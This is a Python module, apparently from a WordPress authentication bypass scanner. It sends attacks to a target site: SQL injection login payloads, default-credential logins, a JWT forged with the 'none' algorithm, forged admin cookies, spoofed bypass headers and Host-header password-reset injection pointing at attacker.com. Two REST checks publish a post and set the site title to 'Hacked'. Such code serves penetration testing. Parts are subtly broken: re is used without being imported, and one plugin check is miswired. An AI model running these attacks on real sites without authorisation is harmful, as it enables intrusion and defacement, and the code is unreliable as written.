"""
WPHunter - Professional Authentication Bypass Scanner
=====================================================
Comprehensive authentication bypass and privilege escalation detection.

Techniques:
1. Protected endpoint bypass
2. SQL injection auth bypass
3. JWT/Token manipulation
4. Session fixation & manipulation
5. Cookie manipulation
6. Password reset bypass
7. Header-based bypass
8. XML-RPC vulnerabilities
9. REST API auth bypass
10. Plugin-specific bypasses
11. Default credentials
12. Privilege escalation

CWE-287: Improper Authentication
CWE-269: Improper Privilege Management
CWE-306: Missing Authentication
"""

import asyncio
import base64
import json
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

from core.http_client import WPHttpClient
from core.logger import logger
from core.security import get_rate_limiter


@dataclass
class AuthFinding:
    """Authentication bypass finding."""
    url: str
    issue: str
    evidence: str
    severity: str = "high"
    cwe: str = "CWE-287"
    payload: Optional[str] = None
    technique: str = ""
    
    def to_dict(self) -> Dict:
        return {
            "type": "Auth Bypass",
            "url": self.url,
            "issue": self.issue,
            "evidence": self.evidence[:300],
            "severity": self.severity,
            "cwe": self.cwe,
            "technique": self.technique,
            "payload": self.payload
        }


class AuthScanner:
    """
    Professional WordPress authentication bypass scanner.
    
    Tests 11 different auth bypass techniques.
    """
    
    # Protected admin endpoints
    PROTECTED_ENDPOINTS = [
        ("/wp-admin/", "dashboard"),
        ("/wp-admin/options.php", "settings"),
        ("/wp-admin/users.php", "users"),
        ("/wp-admin/plugins.php", "plugins"),
        ("/wp-admin/edit.php", "posts"),
        ("/wp-admin/themes.php", "themes"),
    ]
    
    # SQL injection payloads for auth bypass
    SQLI_PAYLOADS = [
        "admin' OR '1'='1'--",
        "admin'--",
        "admin' #",
        "admin' OR 1=1--",
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR 1=1#",
        "admin' OR 'a'='a'--",
        "admin' OR 'x'='x'#",
    ]
    
    # Default credentials to test
    DEFAULT_CREDS = [
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "123456"),
        ("admin", "admin123"),
        ("test", "test"),
        ("demo", "demo"),
    ]
    
    # Known vulnerable plugins with auth bypasses
    VULNERABLE_PLUGINS = {
        "woocommerce": {
            "versions": ["<3.4.0"],
            "bypass_url": "/wp-json/wc/v3/customers",
            "check": lambda text: "email" in text
        },
        "ultimate-member": {
            "versions": ["<2.1.3"],
            "bypass_url": "/wp-json/um/v1/user",
            "check": lambda status: status == 200
        },
        "wp-file-manager": {
            "versions": ["<6.9"],
            "bypass_url": "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
            "check": lambda text: "elFinder" in text
        },
    }
    
    def __init__(self, http_client: WPHttpClient):
        self.http = http_client
        self.findings: List[AuthFinding] = []
        self.rate_limiter = get_rate_limiter()
    
    async def scan(self) -> List[AuthFinding]:
        """Run comprehensive auth bypass scan."""
        logger.section("Authentication Bypass Scan (11 Techniques)")
        
        # 1. Protected endpoints
        await self._check_protected_endpoints()
        
        # 2. SQL injection auth bypass
        await self._check_sqli_auth_bypass()
        
        # 3. JWT/Token bypass
        await self._check_jwt_bypass()
        
        # 4. Cookie manipulation
        await self._check_cookie_manipulation()
        
        # 5. Header-based bypass
        await self._check_header_bypass()
        
        # 6. Password reset bypass
        await self._check_password_reset_bypass()
        
        # 7. REST API auth bypass
        await self._check_rest_api_auth_bypass()
        
        # 8. XML-RPC vulnerabilities
        await self._check_xmlrpc_vulns()
        
        # 9. Plugin-specific bypasses
        await self._check_plugin_auth_bypass()
        
        # 10. Default credentials
        await self._check_default_credentials()
        
        # 11. Session fixation (requires more complex setup - basic check)
        await self._check_session_issues()
        
        logger.success(f"Auth scan: {len(self.findings)} findings")
        return self.findings
    
    async def _check_protected_endpoints(self):
        """Check if protected endpoints are accessible without auth."""
        logger.info("Testing protected endpoint access...")
        
        for endpoint, name in self.PROTECTED_ENDPOINTS:
            await self.rate_limiter.acquire()
            
            try:
                # CRITICAL: Use allow_redirects=False to detect actual access
                response = await self.http.get(endpoint, allow_redirects=False)
                
                # CRITERION 1: No redirect = potential bypass
                if response.status_code == 200:
                    # CRITERION 2: Verify admin content
                    if self._is_admin_content(response.text):
                        self.findings.append(AuthFinding(
                            url=endpoint,
                            issue=f"Admin {name} accessible without authentication",
                            evidence=self._extract_evidence(response.text),
                            severity="critical",
                            cwe="CWE-306",
                            technique="direct_access"
                        ))
                        logger.vuln("critical", f"Auth bypass: {endpoint}")
                
                # CRITERION 3: 302/301 to wp-login = normal (expected)
                elif response.status_code in [301, 302]:
                    location = response.headers.get("Location", "")
                    if "wp-login.php" not in location:
                        # Redirect to something else = suspicious
                        logger.debug(f"Unexpected redirect: {endpoint} → {location}")
                
            except Exception as e:
                logger.debug(f"Error checking {endpoint}: {e}")
                continue
    
    def _is_admin_content(self, html: str) -> bool:
        """
        Strict detection of WordPress admin panel content - FIXED.
        
        Improvements:
        - Flexible regex for wp-admin class (handles quotes, order)
        - Check both single and double quotes for adminmenu
        """
        # CRITICAL CHECK 1: WordPress admin body class (flexible regex)
        if not re.search(r'<body[^>]*class=[\"\'][^\"\']*wp-admin', html, re.IGNORECASE):
            return False
        
        # CRITICAL CHECK 2: Admin menu (both quote styles)
        if 'id="adminmenu"' not in html and 'id=\'adminmenu\'' not in html:
            return False
        
        # CRITICAL CHECK 3: WordPress version in footer
        if 'wp-admin/images/wordpress-logo' not in html:
            return False
        
        # All checks passed
        return True
    
    def _extract_evidence(self, html: str) -> str:
        """Extract evidence from HTML."""
        # Look for admin-specific elements
        if 'id="wpbody-content"' in html:
            return "Admin body content detected"
        elif 'id="wpadminbar"' in html:
            return "WordPress admin bar detected"
        elif 'id="adminmenu"' in html:
            return "Admin menu detected"
        else:
            return "Admin panel content detected"
    
    async def _check_sqli_auth_bypass(self):
        """Test SQL injection in login form."""
        logger.info("Testing SQLi auth bypass...")
        
        for payload in self.SQLI_PAYLOADS[:5]:  # Limit to avoid lockout
            await self.rate_limiter.acquire()
            
            try:
                response = await self.http.post(
                    "/wp-login.php",
                    data={
                        "log": payload,
                        "pwd": "anything",
                        "wp-submit": "Log In",
                        "redirect_to": "/wp-admin/",
                        "testcookie": "1"
                    },
                    allow_redirects=False
                )
                
                # If redirect to admin (not back to login) = potential bypass
                if response.status_code in [301, 302]:
                    location = response.headers.get("Location", "")
                    if "wp-admin" in location and "wp-login" not in location:
                        self.findings.append(AuthFinding(
                            url="/wp-login.php",
                            issue="Potential SQL injection auth bypass",
                            payload=payload,
                            evidence=f"Login succeeded with SQLi payload, redirect to: {location}",
                            severity="critical",
                            cwe="CWE-89",
                            technique="sqli"
                        ))
                        logger.vuln("critical", f"SQLi auth bypass: {payload}")
                        break  # Stop after first success
                
                # Also check if we got admin content directly
                elif response.status_code == 200:
                    if self._is_admin_content(response.text):
                        self.findings.append(AuthFinding(
                            url="/wp-login.php",
                            issue="SQL injection auth bypass confirmed",
                            payload=payload,
                            evidence="Login succeeded with SQLi payload",
                            severity="critical",
                            cwe="CWE-89",
                            technique="sqli"
                        ))
                        logger.vuln("critical", f"SQLi auth bypass confirmed: {payload}")
                        break
                
            except Exception as e:
                logger.debug(f"SQLi test error: {e}")
                continue
    
    async def _check_jwt_bypass(self):
        """Test JWT authentication bypass."""
        logger.info("Testing JWT bypass...")
        
        # Test 1: Detect if JWT is used
        try:
            response = await self.http.post(
                "/wp-json/jwt-auth/v1/token",
                json={"username": "test", "password": "test"}
            )
            
            if "token" in response.text or response.status_code == 403:
                logger.info("JWT authentication detected")
                
                # Test 2: None algorithm bypass
                fake_token = self._create_jwt_none_alg({"user_id": 1, "username": "admin"})
                
                response = await self.http.get(
                    "/wp-json/wp/v2/users/me",
                    headers={"Authorization": f"Bearer {fake_token}"}
                )
                
                if response.ok and response.is_json:
                    self.findings.append(AuthFinding(
                        url="/wp-json/jwt-auth/v1/token",
                        issue="JWT accepts 'none' algorithm",
                        evidence="Forged token with none algorithm accepted",
                        severity="critical",
                        cwe="CWE-347",
                        technique="jwt_none"
                    ))
                    logger.vuln("critical", "JWT none algorithm bypass")
                
        except Exception as e:
            logger.debug(f"JWT test error: {e}")
    
    def _create_jwt_none_alg(self, payload: dict) -> str:
        """Create JWT with algorithm=none."""
        header = {"alg": "none", "typ": "JWT"}
        
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).decode().rstrip("=")
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).decode().rstrip("=")
        
        return f"{header_b64}.{payload_b64}."
    
    async def _check_cookie_manipulation(self):
        """Test cookie manipulation for auth bypass."""
        logger.info("Testing cookie manipulation...")
        
        # Test weak cookie validation
        fake_cookies = {
            "wordpress_logged_in_": "admin|9999999999|hash",
            "wp-settings-1": "admin",
            "wordpress_test_cookie": "WP Cookie check",
        }
        
        try:
            response = await self.http.get(
                "/wp-admin/",
                cookies=fake_cookies,
                allow_redirects=False
            )
            
            if response.status_code == 200 and self._is_admin_content(response.text):
                self.findings.append(AuthFinding(
                    url="/wp-admin/",
                    issue="Weak session cookie validation",
                    evidence="Access granted with forged cookie",
                    severity="critical",
                    cwe="CWE-565",
                    technique="cookie_manipulation"
                ))
                logger.vuln("critical", "Cookie manipulation bypass")
                
        except Exception as e:
            logger.debug(f"Cookie test error: {e}")
    
    async def _check_header_bypass(self):
        """Test header-based authentication bypass."""
        logger.info("Testing header-based bypass...")
        
        bypass_headers = [
            {"User-Agent": "WordPress/5.0"},
            {"Referer": "http://localhost/wp-admin/"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Original-URL": "/wp-admin/"},
            {"X-Rewrite-URL": "/wp-admin/"},
        ]
        
        for headers in bypass_headers:
            await self.rate_limiter.acquire()
            
            try:
                response = await self.http.get(
                    "/wp-admin/",
                    headers=headers,
                    allow_redirects=False
                )
                
                if response.status_code == 200 and self._is_admin_content(response.text):
                    self.findings.append(AuthFinding(
                        url="/wp-admin/",
                        issue=f"Auth bypass via header: {list(headers.keys())[0]}",
                        evidence=f"Header: {headers}",
                        severity="high",
                        cwe="CWE-287",
                        technique="header_bypass"
                    ))
                    logger.vuln("high", f"Header bypass: {list(headers.keys())[0]}")
                    
            except Exception:
                continue
    
    async def _check_password_reset_bypass(self):
        """Test password reset vulnerabilities."""
        logger.info("Testing password reset bypass...")
        
        try:
            # Test 1: Host header injection
            response = await self.http.post(
                "/wp-login.php?action=lostpassword",
                data={"user_login": "admin"},
                headers={"Host": "attacker.com"}
            )
            
            if response.ok and "check your email" in response.text.lower():
                self.findings.append(AuthFinding(
                    url="/wp-login.php",
                    issue="Host header injection in password reset",
                    evidence="Reset email may be sent to attacker domain",
                    severity="high",
                    cwe="CWE-640",
                    technique="password_reset"
                ))
                logger.vuln("high", "Password reset host header injection")
                
        except Exception as e:
            logger.debug(f"Password reset test error: {e}")
    
    async def _check_rest_api_auth_bypass(self):
        """Test REST API authentication bypass."""
        logger.info("Testing REST API auth bypass...")
        
        # Test 1: Attempt to create post without auth
        try:
            response = await self.http.post(
                "/wp-json/wp/v2/posts",
                json={
                    "title": "Auth Bypass Test",
                    "content": "Testing authentication",
                    "status": "publish"
                }
            )
            
            if response.status_code == 201:  # Created
                post_id = response.json().get("id") if response.is_json else "unknown"
                self.findings.append(AuthFinding(
                    url="/wp-json/wp/v2/posts",
                    issue="REST API allows post creation without auth",
                    evidence=f"Created post ID: {post_id}",
                    severity="critical",
                    cwe="CWE-306",
                    technique="rest_api"
                ))
                logger.vuln("critical", "REST API post creation bypass")
                
        except Exception:
            pass
        
        # Test 2: Attempt to modify settings
        try:
            response = await self.http.post(
                "/wp-json/wp/v2/settings",
                json={"title": "Hacked"}
            )
            
            if response.ok:
                self.findings.append(AuthFinding(
                    url="/wp-json/wp/v2/settings",
                    issue="REST API settings writable without auth",
                    evidence="Settings modification successful",
                    severity="critical",
                    cwe="CWE-306",
                    technique="rest_api"
                ))
                logger.vuln("critical", "REST API settings bypass")
                
        except Exception:
            pass
    
    async def _check_xmlrpc_vulns(self):
        """Comprehensive XML-RPC vulnerability testing."""
        logger.info("Testing XML-RPC vulnerabilities...")
        
        try:
            # Test 1: List available methods
            response = await self.http.post(
                "/xmlrpc.php",
                data='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
                headers={"Content-Type": "text/xml"}
            )
            
            if response.ok:
                logger.info("XML-RPC is enabled")
                methods = response.text
                
                # Test 2: Brute force amplification via system.multicall
                if "system.multicall" in methods:
                    self.findings.append(AuthFinding(
                        url="/xmlrpc.php",
                        issue="XML-RPC brute force amplification",
                        evidence="system.multicall allows 100+ login attempts per request",
                        severity="high",
                        cwe="CWE-307",
                        technique="xmlrpc_multicall"
                    ))
                    logger.vuln("high", "XML-RPC multicall brute force possible")
                
                # Test 3: Pingback enabled (DDoS amplification)
                if "pingback.ping" in methods:
                    self.findings.append(AuthFinding(
                        url="/xmlrpc.php",
                        issue="XML-RPC pingback enabled (DDoS vector)",
                        evidence="pingback.ping can be abused for DDoS",
                        severity="medium",
                        cwe="CWE-406",
                        technique="xmlrpc_pingback"
                    ))
                    logger.warning("XML-RPC pingback enabled")
                
        except Exception as e:
            logger.debug(f"XML-RPC test error: {e}")
    
    async def _check_plugin_auth_bypass(self):
        """Test known plugin authentication bypasses."""
        logger.info("Testing plugin-specific auth bypasses...")
        
        for plugin, config in self.VULNERABLE_PLUGINS.items():
            try:
                response = await self.http.get(config["bypass_url"])
                
                # Check if bypass works
                if "check" in config:
                    if callable(config["check"]):
                        # Function check
                        if config["check"](response.text if hasattr(response, 'text') else response.status_code):
                            self.findings.append(AuthFinding(
                                url=config["bypass_url"],
                                issue=f"Known auth bypass in {plugin}",
                                evidence=f"Vulnerable endpoint accessible",
                                severity="critical",
                                cwe="CWE-287",
                                technique=f"plugin_{plugin}"
                            ))
                            logger.vuln("critical", f"Plugin bypass: {plugin}")
                            
            except Exception:
                continue
    
    async def _check_default_credentials(self):
        """Test common default credentials."""
        logger.info("Testing default credentials...")
        
        for username, password in self.DEFAULT_CREDS[:3]:  # Limit to avoid lockout
            await self.rate_limiter.acquire()
            
            try:
                response = await self.http.post(
                    "/wp-login.php",
                    data={
                        "log": username,
                        "pwd": password,
                        "wp-submit": "Log In",
                        "redirect_to": "/wp-admin/",
                        "testcookie": "1"
                    },
                    allow_redirects=False
                )
                
                # Check if login succeeded
                if response.status_code in [301, 302]:
                    location = response.headers.get("Location", "")
                    if "wp-admin" in location and "wp-login" not in location:
                        self.findings.append(AuthFinding(
                            url="/wp-login.php",
                            issue=f"Default credentials: {username}:{password}",
                            evidence="Login successful with default credentials",
                            severity="critical",
                            cwe="CWE-798",
                            technique="default_creds"
                        ))
                        logger.vuln("critical", f"Default creds: {username}:{password}")
                        break  # Stop after first success
                        
            except Exception:
                continue
    
    async def _check_session_issues(self):
        """Basic session security checks."""
        logger.info("Testing session security...")
        
        try:
            # Get initial cookies
            response1 = await self.http.get("/")
            cookies_before = response1.cookies
            
            # Check if session cookies have secure flags
            for cookie in cookies_before:
                if "wordpress" in cookie.name.lower():
                    if not cookie.secure:
                        logger.warning(f"Cookie {cookie.name} missing Secure flag")
                    if not cookie.has_nonstandard_attr("HttpOnly"):
                        logger.warning(f"Cookie {cookie.name} missing HttpOnly flag")
                        
        except Exception as e:
            logger.debug(f"Session test error: {e}")
    
    def get_summary(self) -> Dict:
        """Get comprehensive summary."""
        by_technique = {}
        for finding in self.findings:
            tech = finding.technique or "unknown"
            if tech not in by_technique:
                by_technique[tech] = []
            by_technique[tech].append(finding)
        
        return {
            "total": len(self.findings),
            "by_severity": {
                "critical": len([f for f in self.findings if f.severity == "critical"]),
                "high": len([f for f in self.findings if f.severity == "high"]),
                "medium": len([f for f in self.findings if f.severity == "medium"]),
            },
            "by_technique": {tech: len(findings) for tech, findings in by_technique.items()},
            "findings": [f.to_dict() for f in self.findings]
        }
